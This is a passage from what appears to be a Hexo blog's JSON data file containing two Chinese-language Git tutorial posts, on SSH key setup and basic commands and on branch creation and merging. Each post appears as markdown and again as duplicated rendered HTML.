SSH:\n\n  $ ssh-keygen -t rsa -C '903317164@qq.com'\n\nGenerating public/private rsa key pair.\n\nEnter file in which to save the key (/home/LiSC/.ssh/id_rsa):\nCreated directory '/home/LiSC/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/LiSC/.ssh/id_rsa.\nYour public key has been saved in /home/LiSC/.ssh/id_rsa.pub.\n\nThe key fingerprint is:\n\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com\n\nThe key's randomart image is:\n\n+---[RSA 2048]----+\n|B+OO==o          |\n|o=.=+O           |\n| .+o*.=       .  |\n|  .oo..+     . . |\n|   ...+ S+  . .  |\n|     o  . + o. E |\n|      .  . + ..  |\n|       .  o . ...|\n|       .o.   . +o|\n+----[SHA256]-----+\n-----------------------------------------------\n~$ ssh-keygen -t rsa - c '903317164@qq.com\n生成公共/私有的rsa密钥对。\n输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):\n创建目录/ home / LiSC / . ssh。\n输入passphrase(没有密码):\n再次输入相同的密码:\n您的身份已经保存在/ home/ lisc/. ssh/id_rsa。\n\n您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。\n\n指纹的关键是:\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com\n\n关键的随机图像是:\n+ - - - - - -[RSA 2048]- - - - - +\n| | B + OO = = o\n| o =。= + O |\n| + o *。=。|\n|。","source":"_posts/GIT/git使用指南.md","raw":"---\ntitle: git使用指南\ndate: 2018-04-28 10:18:52\ntags: git\narchives: 版本控制\ncategories: git\n---\n# git使用\n\n## 第一步(安装/全局配置)\n**安装**\n+ 百度 git 然后下载安装\n\n**配置**\n    \n一次性配置,设置`username`和`email`，因为github每次`commit`都会记录他们\n\n+ $ git config --global user.name \"自定义名字\" (注册时填写的名字)\n+ $ git config --global user.email \"email@地址.com\"(注册的地址)\n\n**检验配置是否成功**\n+ 使用 `git config -l` 查看里面的 `user.name` 和 `email` 的值\n\n**查看git版本**\n+ git --version\n\n**创建公钥**\n  + 第一步 : 创建 `ssh-keygen -t rsa -C '[email地址]'`\n  + 第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的`id_rsa.pub`\n    - 进入c盘的`C:\\Users\\标准用户\\.ssh`（一般都是在这个文加下）生成了两个文件，用记事本打开`id_rsa.pub`，全选然后复制。\n  + 第三步 : 登录 github 设置公钥\n    - 进入github官网，选择`setting` -> `ssh and GPG keys` -> `new ssh key` 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。\n  + 选择则保存，然后进入git客户端输入：`ssh -T git@github.com`\n  + 如果`ssh key`配置成功的话，会看到以下效果\n    - $ ssh -T git@github.com\n    - Hi SunOfHomeBoy! You've successfully authenticated, but GitHub does not provide shell access.\n    - 您已经成功地进行了身份验证，但是GitHub不提供shell访问。\n\n## 第二步(初始化项目/本地配置)\n**git初始化**\n  + 在项目目录下 输入 \"git init\"\n\n**git简单命令**\n  + \"ls -a\" 查看项目目录\n\n  + \"git status\" 查看git状态 // 重要\n\n  + \"git add <文件名>\" 向git仓库提交一个文件 // 重要\n  \n  + \"$ git add .\" #把前目录下的所有文件全部添加到暂存区\n  \n  + \"git rm --cached <文件名>\" 从git中移除文件\n  \n  + \"git log\" 查看日志\n\n## 第三步(开始建立远程仓库连接)\n+ `git remote add origin git@github.com:yourName/yourRepo.git`\n\n  `yourName`和`yourRepo`表示你在`github的用户名`和`新建仓库`，加完之后进入.git\n\n  git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git\n\n  $ git push\n  fatal: The current branch dev has no upstream branch.\n  To push the current branch and set the remote as upstream, use\n\n    `git push --set-upstream origin dev`\n\n## 第四步(工作区与暂存区[版本库])\n+ 在git add 提交文件后 使用 \"git commit -m '一句话描述'\" 命令\n\n+ \"git push origin master\" 推送到远程服务器\n\n+ \"git pull origin master\" 从远程服务器拉取到本地\n\n+ \"git checkout -- <文件名>\"  放弃更改\n\n+ \"git reset ‘git log 打印出来的 commit 后面的字符串’ --hard\"  //回退到某个版本\n\n## 第五步(版本库管理)\n**git 删除本地分支**\n+ git branch -D br\n\n**git 删除远程分支**\n+ git push origin :br  (origin 后面有空格)\n+ git push origin 【空格】【冒号】【你的分支名字】\n+ git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】\n\n**git代码库回滚** (指将代码库某分支退回到以前的某个\"commit id\")\n本地代码库回滚\n+ git reset --hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除\n+ git reset --hard HEAD~3：将最近3次的提交回滚\n\n## 附：\n**Git 常用命令大全**\n(http://blog.csdn.net/dengsilinming/article/details/8000622)\n\n**如何使用git上传代码到github**\n(https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html)\n\n常用命令,仅供参考。\n\n## 单位，win10电脑\n  2017年12月29日 09:15:05\n  Ubuntu SSH:\n\n  $ ssh-keygen -t rsa -C '903317164@qq.com'\n\nGenerating public/private rsa key pair.\n\nEnter file in which to save the key (/home/LiSC/.ssh/id_rsa):\nCreated directory '/home/LiSC/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/LiSC/.ssh/id_rsa.\nYour public key has been saved in /home/LiSC/.ssh/id_rsa.pub.\n\nThe key fingerprint is:\n\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com\n\nThe key's randomart image is:\n\n+---[RSA 2048]----+\n|B+OO==o          |\n|o=.=+O           |\n| .+o*.=       .  |\n|  .oo..+     . . |\n|   ...+ S+  . .  |\n|     o  . + o. E |\n|      .  . + ..  |\n|       .  o . ...|\n|       .o.   . +o|\n+----[SHA256]-----+\n-----------------------------------------------\n~$ ssh-keygen -t rsa - c '903317164@qq.com\n生成公共/私有的rsa密钥对。\n输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):\n创建目录/ home / LiSC / . ssh。\n输入passphrase(没有密码):\n再次输入相同的密码:\n您的身份已经保存在/ home/ lisc/. ssh/id_rsa。\n\n您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。\n\n指纹的关键是:\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com\n\n关键的随机图像是:\n+ - - - - - -[RSA 2048]- - - - - +\n| | B + OO = = o\n| o =。= + O |\n| + o *。=。|\n|。","slug":"GIT/git使用指南","published":1,"updated":"2018-05-05T01:18:27.984Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nas000ir8xjp6t6zu8n","content":"<h1 id=\"git使用\"><a href=\"#git使用\" class=\"headerlink\" title=\"git使用\"></a>git使用</h1><h2 id=\"第一步-安装-全局配置\"><a href=\"#第一步-安装-全局配置\" class=\"headerlink\" title=\"第一步(安装/全局配置)\"></a>第一步(安装/全局配置)</h2><p><strong>安装</strong></p>\n<ul>\n<li>百度 git 然后下载安装</li>\n</ul>\n<p><strong>配置</strong></p>\n<p>一次性配置,设置<code>username</code>和<code>email</code>，因为github每次<code>commit</code>都会记录他们</p>\n<ul>\n<li>$ git config –global user.name “自定义名字” (注册时填写的名字)</li>\n<li>$ git config –global user.email “email@地址.com”(注册的地址)</li>\n</ul>\n<p><strong>检验配置是否成功</strong></p>\n<ul>\n<li>使用 <code>git config -l</code> 查看里面的 <code>user.name</code> 和 <code>email</code> 的值</li>\n</ul>\n<p><strong>查看git版本</strong></p>\n<ul>\n<li>git –version</li>\n</ul>\n<p><strong>创建公钥</strong></p>\n<ul>\n<li>第一步 : 创建 <code>ssh-keygen -t rsa -C &#39;[email地址]&#39;</code></li>\n<li>第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的<code>id_rsa.pub</code><ul>\n<li>进入c盘的<code>C:\\Users\\标准用户\\.ssh</code>（一般都是在这个文加下）生成了两个文件，用记事本打开<code>id_rsa.pub</code>，全选然后复制。</li>\n</ul>\n</li>\n<li>第三步 : 登录 github 设置公钥<ul>\n<li>进入github官网，选择<code>setting</code> -&gt; <code>ssh and GPG keys</code> -&gt; <code>new ssh key</code> 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。</li>\n</ul>\n</li>\n<li>选择则保存，然后进入git客户端输入：<code>ssh -T git@github.com</code></li>\n<li>如果<code>ssh key</code>配置成功的话，会看到以下效果<ul>\n<li>$ ssh -T git@github.com</li>\n<li>Hi SunOfHomeBoy! You’ve successfully authenticated, but GitHub does not provide shell access.</li>\n<li>您已经成功地进行了身份验证，但是GitHub不提供shell访问。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二步-初始化项目-本地配置\"><a href=\"#第二步-初始化项目-本地配置\" class=\"headerlink\" title=\"第二步(初始化项目/本地配置)\"></a>第二步(初始化项目/本地配置)</h2><p><strong>git初始化</strong></p>\n<ul>\n<li>在项目目录下 输入 “git init”</li>\n</ul>\n<p><strong>git简单命令</strong></p>\n<ul>\n<li><p>“ls -a” 查看项目目录</p>\n</li>\n<li><p>“git status” 查看git状态 // 重要</p>\n</li>\n<li><p>“git add &lt;文件名&gt;” 向git仓库提交一个文件 // 重要</p>\n</li>\n<li><p>“$ git add .” #把前目录下的所有文件全部添加到暂存区</p>\n</li>\n<li><p>“git rm –cached &lt;文件名&gt;” 从git中移除文件</p>\n</li>\n<li><p>“git log” 查看日志</p>\n</li>\n</ul>\n<h2 id=\"第三步-开始建立远程仓库连接\"><a href=\"#第三步-开始建立远程仓库连接\" class=\"headerlink\" title=\"第三步(开始建立远程仓库连接)\"></a>第三步(开始建立远程仓库连接)</h2><ul>\n<li><p><code>git remote add origin git@github.com:yourName/yourRepo.git</code></p>\n<p><code>yourName</code>和<code>yourRepo</code>表示你在<code>github的用户名</code>和<code>新建仓库</code>，加完之后进入.git</p>\n<p>git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git</p>\n<p>$ git push<br>fatal: The current branch dev has no upstream branch.<br>To push the current branch and set the remote as upstream, use</p>\n<p>  <code>git push --set-upstream origin dev</code></p>\n</li>\n</ul>\n<h2 id=\"第四步-工作区与暂存区-版本库\"><a href=\"#第四步-工作区与暂存区-版本库\" class=\"headerlink\" title=\"第四步(工作区与暂存区[版本库])\"></a>第四步(工作区与暂存区[版本库])</h2><ul>\n<li><p>在git add 提交文件后 使用 “git commit -m ‘一句话描述’” 命令</p>\n</li>\n<li><p>“git push origin master” 推送到远程服务器</p>\n</li>\n<li><p>“git pull origin master” 从远程服务器拉取到本地</p>\n</li>\n<li><p>“git checkout – &lt;文件名&gt;”  放弃更改</p>\n</li>\n<li><p>“git reset ‘git log 打印出来的 commit 后面的字符串’ –hard”  //回退到某个版本</p>\n</li>\n</ul>\n<h2 id=\"第五步-版本库管理\"><a href=\"#第五步-版本库管理\" class=\"headerlink\" title=\"第五步(版本库管理)\"></a>第五步(版本库管理)</h2><p><strong>git 删除本地分支</strong></p>\n<ul>\n<li>git branch -D br</li>\n</ul>\n<p><strong>git 删除远程分支</strong></p>\n<ul>\n<li>git push origin :br  (origin 后面有空格)</li>\n<li>git push origin 【空格】【冒号】【你的分支名字】</li>\n<li>git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】</li>\n</ul>\n<p><strong>git代码库回滚</strong> (指将代码库某分支退回到以前的某个”commit id”)<br>本地代码库回滚</p>\n<ul>\n<li>git reset –hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除</li>\n<li>git reset –hard HEAD~3：将最近3次的提交回滚</li>\n</ul>\n<h2 id=\"附：\"><a href=\"#附：\" class=\"headerlink\" title=\"附：\"></a>附：</h2><p><strong>Git 常用命令大全</strong><br>(<a href=\"http://blog.csdn.net/dengsilinming/article/details/8000622\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dengsilinming/article/details/8000622</a>)</p>\n<p><strong>如何使用git上传代码到github</strong><br>(<a href=\"https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html</a>)</p>\n<p>常用命令,仅供参考。</p>\n<h2 id=\"单位，win10电脑\"><a href=\"#单位，win10电脑\" class=\"headerlink\" title=\"单位，win10电脑\"></a>单位，win10电脑</h2><p>  2017年12月29日 09:15:05<br>  Ubuntu SSH:</p>\n<p>  $ ssh-keygen -t rsa -C ‘903317164@qq.com’</p>\n<p>Generating public/private rsa key pair.</p>\n<p>Enter file in which to save the key (/home/LiSC/.ssh/id_rsa):<br>Created directory ‘/home/LiSC/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /home/LiSC/.ssh/id_rsa.<br>Your public key has been saved in /home/LiSC/.ssh/id_rsa.pub.</p>\n<p>The key fingerprint is:</p>\n<p>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com</p>\n<p>The key’s randomart image is:</p>\n<p>+—[RSA 2048]—-+<br>|B+OO==o          |<br>|o=.=+O           |<br>| .+o*.=       .  |<br>|  .oo..+     . . |<br>|   …+ S+  . .  |<br>|     o  . + o. E |<br>|      .  . + ..  |<br>|       .  o . …|<br>|       .o.   . +o|</p>\n<h2 id=\"—-SHA256-—–\"><a href=\"#—-SHA256-—–\" class=\"headerlink\" title=\"+—-[SHA256]—–+\"></a>+—-[SHA256]—–+</h2><p>~$ ssh-keygen -t rsa - c ‘903317164@qq.com<br>生成公共/私有的rsa密钥对。<br>输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):<br>创建目录/ home / LiSC / . ssh。<br>输入passphrase(没有密码):<br>再次输入相同的密码:<br>您的身份已经保存在/ home/ lisc/. ssh/id_rsa。</p>\n<p>您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。</p>\n<p>指纹的关键是:<br>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com</p>\n<p>关键的随机图像是:</p>\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>-[RSA 2048]- - - - - +<br>| | B + OO = = o<br>| o =。= + O |<br>| + o *。=。|<br>|。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git使用\"><a href=\"#git使用\" class=\"headerlink\" title=\"git使用\"></a>git使用</h1><h2 id=\"第一步-安装-全局配置\"><a href=\"#第一步-安装-全局配置\" class=\"headerlink\" title=\"第一步(安装/全局配置)\"></a>第一步(安装/全局配置)</h2><p><strong>安装</strong></p>\n<ul>\n<li>百度 git 然后下载安装</li>\n</ul>\n<p><strong>配置</strong></p>\n<p>一次性配置,设置<code>username</code>和<code>email</code>，因为github每次<code>commit</code>都会记录他们</p>\n<ul>\n<li>$ git config –global user.name “自定义名字” (注册时填写的名字)</li>\n<li>$ git config –global user.email “email@地址.com”(注册的地址)</li>\n</ul>\n<p><strong>检验配置是否成功</strong></p>\n<ul>\n<li>使用 <code>git config -l</code> 查看里面的 <code>user.name</code> 和 <code>email</code> 的值</li>\n</ul>\n<p><strong>查看git版本</strong></p>\n<ul>\n<li>git –version</li>\n</ul>\n<p><strong>创建公钥</strong></p>\n<ul>\n<li>第一步 : 创建 <code>ssh-keygen -t rsa -C &#39;[email地址]&#39;</code></li>\n<li>第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的<code>id_rsa.pub</code><ul>\n<li>进入c盘的<code>C:\\Users\\标准用户\\.ssh</code>（一般都是在这个文加下）生成了两个文件，用记事本打开<code>id_rsa.pub</code>，全选然后复制。</li>\n</ul>\n</li>\n<li>第三步 : 登录 github 设置公钥<ul>\n<li>进入github官网，选择<code>setting</code> -&gt; <code>ssh and GPG keys</code> -&gt; <code>new ssh key</code> 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。</li>\n</ul>\n</li>\n<li>选择则保存，然后进入git客户端输入：<code>ssh -T git@github.com</code></li>\n<li>如果<code>ssh key</code>配置成功的话，会看到以下效果<ul>\n<li>$ ssh -T git@github.com</li>\n<li>Hi SunOfHomeBoy! You’ve successfully authenticated, but GitHub does not provide shell access.</li>\n<li>您已经成功地进行了身份验证，但是GitHub不提供shell访问。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二步-初始化项目-本地配置\"><a href=\"#第二步-初始化项目-本地配置\" class=\"headerlink\" title=\"第二步(初始化项目/本地配置)\"></a>第二步(初始化项目/本地配置)</h2><p><strong>git初始化</strong></p>\n<ul>\n<li>在项目目录下 输入 “git init”</li>\n</ul>\n<p><strong>git简单命令</strong></p>\n<ul>\n<li><p>“ls -a” 查看项目目录</p>\n</li>\n<li><p>“git status” 查看git状态 // 重要</p>\n</li>\n<li><p>“git add &lt;文件名&gt;” 向git仓库提交一个文件 // 重要</p>\n</li>\n<li><p>“$ git add .” #把前目录下的所有文件全部添加到暂存区</p>\n</li>\n<li><p>“git rm –cached &lt;文件名&gt;” 从git中移除文件</p>\n</li>\n<li><p>“git log” 查看日志</p>\n</li>\n</ul>\n<h2 id=\"第三步-开始建立远程仓库连接\"><a href=\"#第三步-开始建立远程仓库连接\" class=\"headerlink\" title=\"第三步(开始建立远程仓库连接)\"></a>第三步(开始建立远程仓库连接)</h2><ul>\n<li><p><code>git remote add origin git@github.com:yourName/yourRepo.git</code></p>\n<p><code>yourName</code>和<code>yourRepo</code>表示你在<code>github的用户名</code>和<code>新建仓库</code>，加完之后进入.git</p>\n<p>git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git</p>\n<p>$ git push<br>fatal: The current branch dev has no upstream branch.<br>To push the current branch and set the remote as upstream, use</p>\n<p>  <code>git push --set-upstream origin dev</code></p>\n</li>\n</ul>\n<h2 id=\"第四步-工作区与暂存区-版本库\"><a href=\"#第四步-工作区与暂存区-版本库\" class=\"headerlink\" title=\"第四步(工作区与暂存区[版本库])\"></a>第四步(工作区与暂存区[版本库])</h2><ul>\n<li><p>在git add 提交文件后 使用 “git commit -m ‘一句话描述’” 命令</p>\n</li>\n<li><p>“git push origin master” 推送到远程服务器</p>\n</li>\n<li><p>“git pull origin master” 从远程服务器拉取到本地</p>\n</li>\n<li><p>“git checkout – &lt;文件名&gt;”  放弃更改</p>\n</li>\n<li><p>“git reset ‘git log 打印出来的 commit 后面的字符串’ –hard”  //回退到某个版本</p>\n</li>\n</ul>\n<h2 id=\"第五步-版本库管理\"><a href=\"#第五步-版本库管理\" class=\"headerlink\" title=\"第五步(版本库管理)\"></a>第五步(版本库管理)</h2><p><strong>git 删除本地分支</strong></p>\n<ul>\n<li>git branch -D br</li>\n</ul>\n<p><strong>git 删除远程分支</strong></p>\n<ul>\n<li>git push origin :br  (origin 后面有空格)</li>\n<li>git push origin 【空格】【冒号】【你的分支名字】</li>\n<li>git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】</li>\n</ul>\n<p><strong>git代码库回滚</strong> (指将代码库某分支退回到以前的某个”commit id”)<br>本地代码库回滚</p>\n<ul>\n<li>git reset –hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除</li>\n<li>git reset –hard HEAD~3：将最近3次的提交回滚</li>\n</ul>\n<h2 id=\"附：\"><a href=\"#附：\" class=\"headerlink\" title=\"附：\"></a>附：</h2><p><strong>Git 常用命令大全</strong><br>(<a href=\"http://blog.csdn.net/dengsilinming/article/details/8000622\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dengsilinming/article/details/8000622</a>)</p>\n<p><strong>如何使用git上传代码到github</strong><br>(<a href=\"https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html</a>)</p>\n<p>常用命令,仅供参考。</p>\n<h2 id=\"单位，win10电脑\"><a href=\"#单位，win10电脑\" class=\"headerlink\" title=\"单位，win10电脑\"></a>单位，win10电脑</h2><p>  2017年12月29日 09:15:05<br>  Ubuntu SSH:</p>\n<p>  $ ssh-keygen -t rsa -C ‘903317164@qq.com’</p>\n<p>Generating public/private rsa key pair.</p>\n<p>Enter file in which to save the key (/home/LiSC/.ssh/id_rsa):<br>Created directory ‘/home/LiSC/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /home/LiSC/.ssh/id_rsa.<br>Your public key has been saved in /home/LiSC/.ssh/id_rsa.pub.</p>\n<p>The key fingerprint is:</p>\n<p>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com</p>\n<p>The key’s randomart image is:</p>\n<p>+—[RSA 2048]—-+<br>|B+OO==o          |<br>|o=.=+O           |<br>| .+o*.=       .  |<br>|  .oo..+     . . |<br>|   …+ S+  . .  |<br>|     o  . + o. E |<br>|      .  . + ..  |<br>|       .  o . …|<br>|       .o.   . +o|</p>\n<h2 id=\"—-SHA256-—–\"><a href=\"#—-SHA256-—–\" class=\"headerlink\" title=\"+—-[SHA256]—–+\"></a>+—-[SHA256]—–+</h2><p>~$ ssh-keygen -t rsa - c ‘903317164@qq.com<br>生成公共/私有的rsa密钥对。<br>输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):<br>创建目录/ home / LiSC / . ssh。<br>输入passphrase(没有密码):<br>再次输入相同的密码:<br>您的身份已经保存在/ home/ lisc/. ssh/id_rsa。</p>\n<p>您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。</p>\n<p>指纹的关键是:<br>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com</p>\n<p>关键的随机图像是:</p>\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>-[RSA 2048]- - - - - +<br>| | B + OO = = o<br>| o =。= + O |<br>| + o *。=。|<br>|。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"git 操作规范","date":"2018-04-28T07:25:23.000Z","archives":"版本控制","_content":"## 一、 创建与合并分支\n1. 从master分支创建dev分支并切换到dev分支\n````\n  git checkout master    \n  git checkout -b dev\n````\n+ `git checkout -b dev` 等价于：\n````\n  git branch dev    \n  git checkout dev\n````\n+ 查看`本地当前分支`，分支前面带` \"*\" `表示当前分支，剩下的分支表示本地有的分支：\n````\n  git branch\n````\n+ 查看`远程全部分支`，白色的表示本地有的，红色的表示本地没有，仅在远程存在：\n````\n  git branch -a\n````\n\n2. 修改代码、提交代码(当前的操作是在dev分支上进行)\n````\n  git add a.html\n  git commit -m \"提交文件a.html\"\n````\n\n3. 分支合并(将dev合并到master)\n````\n  git checkout master     \n  git merge dev\n````\n\n4. 合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)\n````\n  git branch -d dev\n````\n\n5. 删除后，查看分支(此时看不到dev分支了)\n````\n  git branch\n````\n\n6. 总结 ：工作中经常从`master`创建新分支，具体操作如下：\n````\n  git checkout master   \n  git checkout -b  issues1234   \n  git push origin issues1234   \n  git add ..  \n  git commit -m \"***\"\n  git push origin issues1234\n````\n\n+ 注意：将本地分支branch1推到远端的branch2操作步骤：\n````\n  git push origin branch1:branch2\n````\n\n7. 删除分支\n\n  git branch -D issues1234 // 本地强制删除分支 issues1234    \n\n  git push origin  :issues1234  //推到远程","source":"_posts/GIT/git-操作规范.md","raw":"---\ntitle: git 操作规范\ndate: 2018-04-28 15:25:23\ntags: git 操作规范\narchives: 版本控制\ncategories: git\n---\n## 一、 创建与合并分支\n1. 从master分支创建dev分支并切换到dev分支\n````\n  git checkout master    \n  git checkout -b dev\n````\n+ `git checkout -b dev` 等价于：\n````\n  git branch dev    \n  git checkout dev\n````\n+ 查看`本地当前分支`，分支前面带` \"*\" `表示当前分支，剩下的分支表示本地有的分支：\n````\n  git branch\n````\n+ 查看`远程全部分支`，白色的表示本地有的，红色的表示本地没有，仅在远程存在：\n````\n  git branch -a\n````\n\n2. 修改代码、提交代码(当前的操作是在dev分支上进行)\n````\n  git add a.html\n  git commit -m \"提交文件a.html\"\n````\n\n3. 分支合并(将dev合并到master)\n````\n  git checkout master     \n  git merge dev\n````\n\n4. 合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)\n````\n  git branch -d dev\n````\n\n5. 删除后，查看分支(此时看不到dev分支了)\n````\n  git branch\n````\n\n6. 总结 ：工作中经常从`master`创建新分支，具体操作如下：\n````\n  git checkout master   \n  git checkout -b  issues1234   \n  git push origin issues1234   \n  git add ..  \n  git commit -m \"***\"\n  git push origin issues1234\n````\n\n+ 注意：将本地分支branch1推到远端的branch2操作步骤：\n````\n  git push origin branch1:branch2\n````\n\n7. 删除分支\n\n  git branch -D issues1234 // 本地强制删除分支 issues1234    \n\n  git push origin  :issues1234  //推到远程","slug":"GIT/git-操作规范","published":1,"updated":"2018-05-05T01:18:27.984Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nau000jr8xjfm0g55gb","content":"<h2 id=\"一、-创建与合并分支\"><a href=\"#一、-创建与合并分支\" class=\"headerlink\" title=\"一、 创建与合并分支\"></a>一、 创建与合并分支</h2><ol>\n<li>从master分支创建dev分支并切换到dev分支<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master    </span><br><span class=\"line\">git checkout -b dev</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p><code>git checkout -b dev</code> 等价于：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch dev    </span><br><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>本地当前分支</code>，分支前面带<code>&quot;*&quot;</code>表示当前分支，剩下的分支表示本地有的分支：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>远程全部分支</code>，白色的表示本地有的，红色的表示本地没有，仅在远程存在：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>修改代码、提交代码(当前的操作是在dev分支上进行)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add a.html</span><br><span class=\"line\">git commit -m &quot;提交文件a.html&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>分支合并(将dev合并到master)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master     </span><br><span class=\"line\">git merge dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除后，查看分支(此时看不到dev分支了)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总结 ：工作中经常从<code>master</code>创建新分支，具体操作如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master   </span><br><span class=\"line\">git checkout -b  issues1234   </span><br><span class=\"line\">git push origin issues1234   </span><br><span class=\"line\">git add ..  </span><br><span class=\"line\">git commit -m &quot;***&quot;</span><br><span class=\"line\">git push origin issues1234</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>注意：将本地分支branch1推到远端的branch2操作步骤：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin branch1:branch2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>删除分支</p>\n<p>git branch -D issues1234 // 本地强制删除分支 issues1234    </p>\n<p>git push origin  :issues1234  //推到远程</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、-创建与合并分支\"><a href=\"#一、-创建与合并分支\" class=\"headerlink\" title=\"一、 创建与合并分支\"></a>一、 创建与合并分支</h2><ol>\n<li>从master分支创建dev分支并切换到dev分支<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master    </span><br><span class=\"line\">git checkout -b dev</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p><code>git 